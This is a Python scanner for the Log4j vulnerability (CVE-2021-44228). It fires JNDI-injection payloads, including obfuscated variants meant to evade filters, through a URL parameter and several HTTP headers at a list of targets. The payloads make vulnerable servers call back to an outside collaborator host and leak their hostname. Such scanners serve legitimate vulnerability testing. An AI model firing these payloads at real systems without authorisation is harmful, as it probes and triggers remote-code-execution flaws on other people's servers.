import argparse, sys, requests
from urllib3 import disable_warnings
from concurrent.futures import ThreadPoolExecutor

class customParser(argparse.ArgumentParser):
    def error(self, message):
        sys.stderr.write('error: %s\n' % message)
        self.print_help()
        sys.exit(2)
parser = customParser(prog='log4j-detect', description='Python 3 script to detect the Log4j Java library vulnerability (CVE-2021-44228)')
parser.add_argument('u', help='Single URL / File with a list of URLs')
parser.add_argument('s', help='Server from Burp Collaborator, interactsh or similar')
parser.add_argument('-t', '--threads', help='Number of threads', type=int, default=15)
parser.add_argument('-p', '--proxy', help='Send traffic through a proxy (by default, Burp)', nargs='?', default=None, const='http://127.0.0.1:8080')
args = parser.parse_args()

def sendRequest(url, urlId):
    try:
        payload1 = '${jndi:ldap://' + str(urlId) + '.${hostName}.' + args.s + '/a}'
        payload2 = '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://' + str(urlId) + '.${hostName}.' + args.s + '}'
        payload3 = '${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://' + str(urlId) + '.${hostName}.' + args.s + '}'
        params = {'x':payload1}
        headers = {'User-Agent':payload2, 'Referer':payload3, 'X-Forwarded-For':payload3, 'Authentication':payload3}
        r = requests.get(url, headers=headers, params=params, verify=False, proxies=proxies, timeout=10)
        print('[{}] {} ({})'.format(urlId, url, r.status_code))
    except Exception as e:
        print('[{}] Error while testing {}:'.format(urlId, url))
        print(e)
        pass

disable_warnings()
if args.proxy is None:
    proxies = {}
else:
    proxies = {'http':args.proxy, 'https':args.proxy}
urlId = 0
try:
    with open(args.u) as urlFile:
        urlList = (line.strip() for line in urlFile)
        urlList = list(line for line in urlList if line)
        urlList = list(dict.fromkeys(urlList))
        urlLength = len(urlList)
        if urlLength > 1:
            print('[!] {} URLs loaded'.format(urlLength))
except:
    urlList = [args.u]
with ThreadPoolExecutor(max_workers=args.threads) as executor:
    for url in urlList:
        urlId += 1
        executor.submit(sendRequest, url, urlId)
